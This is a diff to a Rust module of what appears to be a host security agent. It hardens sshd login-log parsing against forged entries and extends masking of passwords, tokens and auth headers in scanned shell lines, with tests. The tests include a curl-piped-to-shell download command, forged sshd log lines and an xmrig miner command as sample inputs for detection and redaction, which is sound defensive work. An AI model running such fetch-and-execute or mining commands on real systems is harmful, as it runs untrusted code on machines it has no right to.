@@ -5,6 +5,8 @@
 //! Everything parsed here comes from a machine that may be compromised, so the
 //! results are bounded and cut short, and nothing is ever executed or expanded.
 
+use std::net::IpAddr;
+
 use sha2::{Digest, Sha256};
 use snsec_common::schema::{EvLogin, EvPersist, EvUser};
 
@@ -123,27 +125,67 @@ pub fn looks_like_kthread(comm: &str) -> bool {
         .any(|p| c.starts_with(p))
 }
 
-/// The text of an sshd log line after sshd's own tag (`sshd[123]: ` or `sshd: `).
-/// The tag must start a word, and the first valid one wins: anything after it,
-/// including a user name that spells out another tag, is part of the message.
-fn sshd_message(line: &str) -> Option<&str> {
-    for (i, _) in line.match_indices("sshd") {
-        if i > 0 && !line[..i].ends_with(' ') {
-            continue;
-        }
-        let rest = &line[i + 4..];
-        if let Some(m) = rest.strip_prefix(": ") {
-            return Some(m);
-        }
-        if let Some(r) = rest.strip_prefix('[')
-            && let Some((pid, m)) = r.split_once("]: ")
-            && !pid.is_empty()
-            && pid.chars().all(|c| c.is_ascii_digit())
-        {
-            return Some(m);
-        }
+/// `line` after its first `n` words.
+fn after_words(line: &str, n: usize) -> Option<&str> {
+    let mut rest = line.trim_start();
+    for _ in 0..n {
+        let end = rest.find(char::is_whitespace)?;
+        rest = rest[end..].trim_start();
     }
-    None
+    Some(rest)
+}
+
+/// The text of an sshd log line after sshd's own tag (`sshd[123]: `, `sshd: `, or
+/// `sshd-session[123]: ` from OpenSSH 9.8 on). The tag must be the syslog program
+/// field, right after the time stamp and the host name: a tag-like word later in
+/// the line (a user name sshd copied, another program's message) is message text.
+fn sshd_message(line: &str) -> Option<&str> {
+    // An ISO time stamp is one word, a classic one (`Oct 12 02:11:33`) three.
+    let stamp = if line.trim_start().starts_with(|c: char| c.is_ascii_digit()) {
+        1
+    } else {
+        3
+    };
+    let (tag, msg) = after_words(line, stamp + 1)?.split_once(": ")?;
+    let program = match tag.strip_suffix(']') {
+        Some(t) => {
+            let (name, pid) = t.split_once('[')?;
+            if pid.is_empty() || !pid.bytes().all(|b| b.is_ascii_digit()) {
+                return None;
+            }
+            name
+        }
+        None => tag,
+    };
+    matches!(program, "sshd" | "sshd-session").then_some(msg)
+}
+
+/// A successful SSH login, read strictly: sshd's own tag, then exactly
+/// `Accepted <method> for <user> from <ip> port <n>`, then nothing but ` ssh2` and
+/// `: <key>`. Returns (method, user, address). The evidence list and the never-ban
+/// whitelist both read logins through this, and nothing else.
+#[must_use]
+pub fn accepted_login(line: &str) -> Option<(&str, &str, IpAddr)> {
+    let tail = sshd_message(line)?.strip_prefix("Accepted ")?;
+    let mut t = tail.splitn(7, ' ');
+    let (method, for_, user, from, ip, port_kw, rest) = (
+        t.next()?,
+        t.next()?,
+        t.next()?,
+        t.next()?,
+        t.next()?,
+        t.next()?,
+        t.next()?,
+    );
+    if method.is_empty() || for_ != "for" || user.is_empty() || from != "from" || port_kw != "port"
+    {
+        return None;
+    }
+    let ip = ip.parse::<IpAddr>().ok()?;
+    let (port, after) = rest.split_once(' ').unwrap_or((rest, ""));
+    port.parse::<u16>().ok()?;
+    let after = after.strip_prefix("ssh2").unwrap_or(after);
+    (after.is_empty() || after.starts_with(": ")).then_some((method, user, ip))
 }
 
 /// Words whose value is a secret when written `word=value`.
@@ -152,9 +194,83 @@ const SECRET_KEYS: &[&str] = &[
     "key",
 ];
 
+/// Programs whose password is the argument of a bare short flag:
+/// `sshpass -p PW`, `redis-cli -a PW`, `openssl enc -k PW`.
+const PASSWORD_FLAGS: &[(&str, &str)] =
+    &[("sshpass", "-p"), ("redis-cli", "-a"), ("openssl", "-k")];
+
+const QUOTES: [char; 2] = ['\'', '"'];
+
+/// A header (or `name:value` word) whose value is a secret: `Authorization`,
+/// `Cookie`, `X-Api-Key`, `X-Auth-Token`, openssl's `pass:`.
+fn secret_name(name: &str) -> bool {
+    let n = name.to_ascii_lowercase();
+    !n.is_empty()
+        && n.bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
+        && (n == "cookie"
+            || ["auth", "key", "token", "secret", "pass"]
+                .iter()
+                .any(|k| n.contains(k)))
+}
+
+/// The scheme word of an `Authorization` value, which comes before the secret.
+fn is_auth_scheme(word: &str) -> bool {
+    matches!(
+        word.trim_matches(QUOTES).to_ascii_lowercase().as_str(),
+        "basic" | "bearer" | "digest" | "token"
+    )
+}
+
+/// `***` in place of a word, keeping the quotes around it so the line still
+/// reads as it was written.
+fn masked(tok: &str) -> String {
+    let inner = tok.trim_matches(QUOTES);
+    if inner.is_empty() {
+        return tok.to_string();
+    }
+    let lead = tok.len() - tok.trim_start_matches(QUOTES).len();
+    let trail = tok.trim_end_matches(QUOTES).len();
+    format!("{}***{}", &tok[..lead], &tok[trail..])
+}
+
+/// `user:pass` or `user,pass` (lftp) with the part after the separator masked.
+fn user_pass(tok: &str) -> String {
+    match tok.find([':', ',']) {
+        Some(i) if i + 1 < tok.trim_end_matches(QUOTES).len() => {
+            format!("{}{}", &tok[..=i], masked(&tok[i + 1..]))
+        }
+        _ => tok.to_string(),
+    }
+}
+
+/// A Telegram-style bot token in a URL path (`/bot123456:AAH.../sendMessage`).
+fn mask_bot_token(tok: &str) -> std::borrow::Cow<'_, str> {
+    if let Some(i) = tok.find("/bot") {
+        let after = &tok[i + 4..];
+        let digits = after.bytes().take_while(u8::is_ascii_digit).count();
+        if digits > 0 && after[digits..].starts_with(':') {
+            let secret = &after[digits + 1..];
+            let end = secret.find(['/', '?', '\'', '"']).unwrap_or(secret.len());
+            if end > 0 {
+                return format!(
+                    "{}/bot{}:***{}",
+                    &tok[..i],
+                    &after[..digits],
+                    &secret[end..]
+                )
+                .into();
+            }
+        }
+    }
+    tok.into()
+}
+
 /// Mask the secrets that are commonly typed on a command line or written in a
 /// shell file: `password=…`, `--token=…`, `-pSECRET` (mysql style), `-u user:pass`,
-/// `https://user:pass@host`, and the word after `Bearer` or `--password`.
+/// `https://user:pass@host`, the word after `Bearer`, `Basic` or `--password`,
+/// secret header values (`Authorization:`, `X-Api-Key:`), openssl's `pass:…`,
+/// `sshpass -p`, `redis-cli -a`, and a bot token in a URL.
 /// A best effort: it cannot know every convention, so the text it returns may
 /// still contain a secret, and the UI says so.
 #[must_use]
@@ -162,21 +278,54 @@ pub fn redact(s: &str) -> String {
     let mut out: Vec<String> = Vec::new();
     let mut mask_next = false;
     let mut user_next = false;
-    for tok in s.split(' ') {
+    // The password flag of the last program named that takes one, until used.
+    let mut tool_flag: Option<&str> = None;
+    for raw in s.split(' ') {
+        // Two spaces in a row are an empty word: it is not the value.
+        if raw.is_empty() {
+            out.push(String::new());
+            continue;
+        }
+        let tok = mask_bot_token(raw);
+        let tok = tok.as_ref();
+        let lower = tok.to_ascii_lowercase();
+        let bare = lower.trim_matches(QUOTES);
         if mask_next {
             mask_next = false;
-            out.push("***".into());
+            // `Authorization: Basic xyz`: the scheme stays, the credential goes.
+            if is_auth_scheme(bare) {
+                mask_next = true;
+                out.push(tok.to_string());
+            } else {
+                out.push(masked(tok));
+            }
             continue;
         }
         if user_next {
             user_next = false;
-            out.push(match tok.split_once(':') {
-                Some((u, _)) => format!("{u}:***"),
-                None => tok.to_string(),
-            });
+            out.push(user_pass(tok));
             continue;
         }
-        let lower = tok.to_ascii_lowercase();
+        // The flag alone, or with the value attached where the program takes
+        // that (`sshpass -pSECRET`; openssl's `-keyout` is another option).
+        if let Some(flag) = tool_flag
+            && let Some(rest) = tok.strip_prefix(flag)
+            && (rest.is_empty() || flag == "-p")
+        {
+            tool_flag = None;
+            if rest.is_empty() {
+                mask_next = true;
+                out.push(tok.to_string());
+            } else {
+                out.push(format!("{flag}***"));
+            }
+            continue;
+        }
+        // The program's own name: `/usr/bin/redis-cli`, `command="redis-cli`.
+        let program = bare.rsplit(['/', '=', '"', '\'']).next();
+        if let Some((_, flag)) = PASSWORD_FLAGS.iter().find(|(p, _)| program == Some(*p)) {
+            tool_flag = Some(flag);
+        }
         // scheme://user:pass@host
         if let Some(i) = tok.find("://")
             && let Some(at) = tok[i + 3..].find('@')
@@ -187,17 +336,43 @@ pub fn redact(s: &str) -> String {
                 continue;
             }
         }
-        // key=value with a secret-looking key
+        // key=value with a secret-looking key; --user=name:pass
         if let Some(eq) = lower.find('=') {
             let key = lower[..eq].trim_start_matches('-');
             if SECRET_KEYS.iter().any(|k| key.ends_with(k)) {
                 out.push(format!("{}=***", &tok[..eq]));
                 continue;
             }
+            if key == "user" {
+                out.push(format!("{}={}", &tok[..eq], user_pass(&tok[eq + 1..])));
+                continue;
+            }
+        }
+        // `Authorization:` / `X-Api-Key:` as its own word: the value follows.
+        if let Some(name) = bare.strip_suffix(':')
+            && secret_name(name)
+        {
+            mask_next = true;
+            out.push(tok.to_string());
+            continue;
+        }
+        // `X-Api-Key:abc`, `pass:secret` (openssl) in one word.
+        if let Some((name, value)) = tok.trim_start_matches(QUOTES).split_once(':')
+            && !value.trim_matches(QUOTES).is_empty()
+            && secret_name(name)
+        {
+            if is_auth_scheme(value) {
+                mask_next = true;
+                out.push(tok.to_string());
+            } else {
+                let cut_at = tok.len() - value.len();
+                out.push(format!("{}{}", &tok[..cut_at], masked(value)));
+            }
+            continue;
         }
         match lower.as_str() {
-            "--password" | "--passwd" | "--token" | "--secret" | "--api-key" | "--apikey"
-            | "bearer" => {
+            "--password" | "--passwd" | "--pass" | "--token" | "--secret" | "--api-key"
+            | "--apikey" | "bearer" | "basic" => {
                 mask_next = true;
                 out.push(tok.to_string());
                 continue;
@@ -208,6 +383,11 @@ pub fn redact(s: &str) -> String {
                 continue;
             }
             _ => {}
+        }
+        // curl -uadmin:secret
+        if tok.len() > 2 && tok.starts_with("-u") && tok.contains([':', ',']) {
+            out.push(format!("-u{}", user_pass(&tok[2..])));
+            continue;
         }
         // mysql -pSECRET (but not ssh -p2222: a port is all digits)
         if tok.starts_with("-p") && tok.len() > 2 && !tok[2..].chars().all(|c| c.is_ascii_digit()) {
@@ -245,6 +425,15 @@ fn cut(s: &str, max: usize) -> String {
 #[must_use]
 pub fn line_sha(line: &str) -> String {
     hex::encode(Sha256::digest(line.trim().as_bytes()))
+}
+
+/// The hash a line is identified by in the evidence: of the line with its secrets
+/// masked, like the text shipped next to it. A hash of the raw line would let
+/// anyone holding the evidence test guesses at a password written in it. The
+/// agent hashes the live line the same way before it edits it.
+#[must_use]
+pub fn redacted_line_sha(line: &str) -> String {
+    line_sha(&redact(line.trim()))
 }
 
 /// Why a shell start-up line deserves a look, or `None` for an ordinary one.
@@ -300,7 +489,7 @@ pub fn scan_rc(text: &str, path: &str, user: &str, max: usize) -> Vec<EvPersist>
             user: user.to_string(),
             line_no: u32::try_from(i + 1).unwrap_or(u32::MAX),
             line: cut(&redact(line.trim()), LINE_MAX),
-            sha256: line_sha(line),
+            sha256: redacted_line_sha(line),
             reason: reason.to_string(),
         });
         if out.len() >= max {
@@ -312,7 +501,7 @@ pub fn scan_rc(text: &str, path: &str, user: &str, max: usize) -> Vec<EvPersist>
 
 /// `authorized_keys` entries without the key itself (long, and not useful to a
 /// reader): the key type, any options, and the comment. The hash covers the whole
-/// line, so it still identifies it.
+/// (redacted) line, key included, so it still identifies it.
 #[must_use]
 pub fn scan_authorized_keys(text: &str, path: &str, user: &str, max: usize) -> Vec<EvPersist> {
     let mut out = Vec::new();
@@ -334,7 +523,7 @@ pub fn scan_authorized_keys(text: &str, path: &str, user: &str, max: usize) -> V
             user: user.to_string(),
             line_no: u32::try_from(i + 1).unwrap_or(u32::MAX),
             line: cut(&redact(&shown.join(" ")), LINE_MAX),
-            sha256: line_sha(l),
+            sha256: redacted_line_sha(l),
             reason: if has_options {
                 "key with forced command or source restriction".into()
             } else {
@@ -371,29 +560,12 @@ fn log_time(line: &str) -> String {
 pub fn parse_ssh_logins(text: &str) -> Vec<EvLogin> {
     let mut out: Vec<EvLogin> = Vec::new();
     for line in text.lines() {
-        // The message is what follows sshd's own tag (`sshd[123]: ` or `sshd: `).
         // Matching "Accepted " anywhere in the line would let someone forge a
         // login by giving the server a user name that spells one out: sshd logs
         // that name verbatim after "Invalid user" or "Failed password for".
-        let Some(msg) = sshd_message(line) else {
+        let Some((method, user, ip)) = accepted_login(line) else {
             continue;
         };
-        let Some(tail) = msg.strip_prefix("Accepted ") else {
-            continue;
-        };
-        let mut t = tail.split_whitespace();
-        let method = t.next().unwrap_or("");
-        if t.next() != Some("for") {
-            continue;
-        }
-        let user = t.next().unwrap_or("");
-        if t.next() != Some("from") {
-            continue;
-        }
-        let ip = t.next().unwrap_or("");
-        if user.is_empty() || ip.parse::<std::net::IpAddr>().is_err() {
-            continue;
-        }
         let entry = EvLogin {
             user: cut(user, 40),
             ip: ip.to_string(),
@@ -636,12 +808,126 @@ mod hardening_tests {
     }
 
     #[test]
-    fn the_hash_of_a_redacted_line_is_still_the_hash_of_the_original() {
-        let text = "echo hi\ncurl -u a:b http://h/x.sh | sh\n";
-        let e = scan_rc(text, "/home/u/.bashrc", "u", 5);
+    fn the_hash_is_of_the_redacted_line_so_it_cannot_confirm_a_guessed_secret() {
+        let raw = "curl -u a:hunter2 http://h/x.sh | sh";
+        let text = format!("echo hi\n  {raw}  \n");
+        let e = scan_rc(&text, "/home/u/.bashrc", "u", 5);
         assert_eq!(e.len(), 1);
-        assert!(!e[0].line.contains(":b "), "{}", e[0].line);
-        assert_eq!(e[0].sha256, line_sha("curl -u a:b http://h/x.sh | sh"));
+        assert!(!e[0].line.contains("hunter2"), "{}", e[0].line);
+        assert_eq!(e[0].sha256, line_sha("curl -u a:*** http://h/x.sh | sh"));
+        assert_eq!(e[0].sha256, redacted_line_sha(raw));
+        assert_ne!(e[0].sha256, line_sha(raw));
+        // A guess at the secret hashes the same as any other: nothing to confirm.
+        assert_eq!(
+            redacted_line_sha("curl -u a:guess http://h/x.sh | sh"),
+            e[0].sha256
+        );
+        // A line with nothing to mask hashes as before.
+        assert_eq!(redacted_line_sha(" nohup x & "), line_sha("nohup x &"));
+        // authorized_keys entries are hashed the same way.
+        let k = scan_authorized_keys(
+            "command=\"redis-cli -a s3cret ping\" ssh-ed25519 AAAA k\n",
+            "/home/u/.ssh/authorized_keys",
+            "u",
+            5,
+        );
+        assert!(!k[0].line.contains("s3cret"), "{}", k[0].line);
+        assert_eq!(
+            k[0].sha256,
+            redacted_line_sha("command=\"redis-cli -a s3cret ping\" ssh-ed25519 AAAA k")
+        );
+    }
+
+    #[test]
+    fn more_secret_forms_are_masked() {
+        for (given, secret) in [
+            ("sshpass -p 123456 ssh root@h", "123456"),
+            ("sshpass -p1234 ssh root@h", "1234"),
+            ("redis-cli -h 10.0.0.2 -a r3dispw ping", "r3dispw"),
+            ("/usr/bin/redis-cli -a r3dispw", "r3dispw"),
+            ("openssl enc -d -aes-256-cbc -k encpw -in x", "encpw"),
+            ("openssl req -new -keyout k.pem -k encpw", "encpw"),
+            ("openssl rsa -passin pass:keypw -in k.pem", "keypw"),
+            (
+                "curl -H 'Authorization: Basic dXNlcjpwYXNz' https://x",
+                "dXNlcjpwYXNz",
+            ),
+            (
+                "curl -H \"Authorization:Bearer tok123\" https://x",
+                "tok123",
+            ),
+            ("curl -H 'X-Api-Key: abcdef' https://x", "abcdef"),
+            ("curl -H X-Auth-Token:zzz999 https://x", "zzz999"),
+            ("curl -H 'Cookie: session=s3ss' https://x", "s3ss"),
+            ("curl -uadmin:s3cret https://x", "s3cret"),
+            ("curl --user=admin:s3cret https://x", "s3cret"),
+            ("lftp -u bob,ftppw ftp://h", "ftppw"),
+            (
+                "curl https://api.telegram.org/bot123456:AAHsecretTok/sendMessage",
+                "AAHsecretTok",
+            ),
+            ("app --password  spaced", "spaced"),
+        ] {
+            let r = redact(given);
+            assert!(!r.contains(secret), "{given} -> {r}");
+            assert!(r.contains("***"), "{given} -> {r}");
+        }
+        // The quotes stay where they were.
+        assert_eq!(
+            redact("curl -H 'Authorization: Basic dXNlcjpwYXNz' https://x"),
+            "curl -H 'Authorization: Basic ***' https://x"
+        );
+        assert_eq!(
+            redact("curl https://api.telegram.org/bot12:AAH/sendMessage?chat_id=1"),
+            "curl https://api.telegram.org/bot12:***/sendMessage?chat_id=1"
+        );
+        // Not a secret: the same flags on other programs, a pool address.
+        for s in [
+            "curl -a -k https://x",
+            "ssh -p 22 h",
+            "openssl x509 -in c.pem -noout",
+            "openssl req -new -key k.pem -keyout x.pem",
+            "xmrig -o stratum+tcp://pool.example:3333",
+            "env:HOME",
+        ] {
+            assert_eq!(redact(s), s);
+        }
+    }
+
+    #[test]
+    fn a_login_is_read_only_from_sshds_own_program_field() {
+        let ok = [
+            "Oct 12 02:11:40 host sshd[1]: Accepted password for a from 1.2.3.4 port 5555 ssh2",
+            "Oct  2 02:11:40 host sshd[1]: Accepted password for a from 1.2.3.4 port 5555 ssh2",
+            "Oct 12 02:11:40 host sshd-session[77]: Accepted publickey for a from 2001:db8::1 port 22 ssh2: ED25519 SHA256:abc",
+            "2026-10-12T03:00:00.123+07:00 host sshd-session[2]: Accepted keyboard-interactive/pam for a from 1.2.3.4 port 1 ssh2",
+            "Oct 12 02:11:40 host sshd: Accepted password for a from 1.2.3.4 port 5555",
+        ];
+        for l in ok {
+            assert!(accepted_login(l).is_some(), "{l}");
+        }
+        assert_eq!(
+            accepted_login(ok[2]),
+            Some(("publickey", "a", "2001:db8::1".parse().unwrap()))
+        );
+        let forged = [
+            // Another authpriv program logging a name the client chose.
+            "Oct 12 02:11:40 host vsftpd[3]: sshd[1]: Accepted password for a from 6.6.6.6 port 1 ssh2",
+            "Oct 12 02:11:40 host su[3]: pam: sshd: Accepted password for a from 6.6.6.6 port 1 ssh2",
+            // A tag that is not the program field.
+            "Oct 12 02:11:40 sshd[1]: Accepted password for a from 6.6.6.6 port 1 ssh2",
+            "Oct 12 02:11:40 host sshd-auth[1]: Accepted password for a from 6.6.6.6 port 1 ssh2",
+            "Oct 12 02:11:40 host sshd[x]: Accepted password for a from 6.6.6.6 port 1 ssh2",
+            // Not the exact shape.
+            "Oct 12 02:11:40 host sshd[1]: Accepted password for a from 6.6.6.6",
+            "Oct 12 02:11:40 host sshd[1]: Accepted password for a from 6.6.6.6 port x ssh2",
+            "Oct 12 02:11:40 host sshd[1]: Accepted password for a from 6.6.6.6 port 1 from 9.9.9.9 port 2",
+            "Oct 12 02:11:40 host sshd[1]: Accepted password for a b from 6.6.6.6 port 1 ssh2",
+            "Oct 12 02:11:40 host sshd[1]:  Accepted password for a from 6.6.6.6 port 1 ssh2",
+        ];
+        for l in forged {
+            assert!(accepted_login(l).is_none(), "{l}");
+        }
     }
 
     #[test]
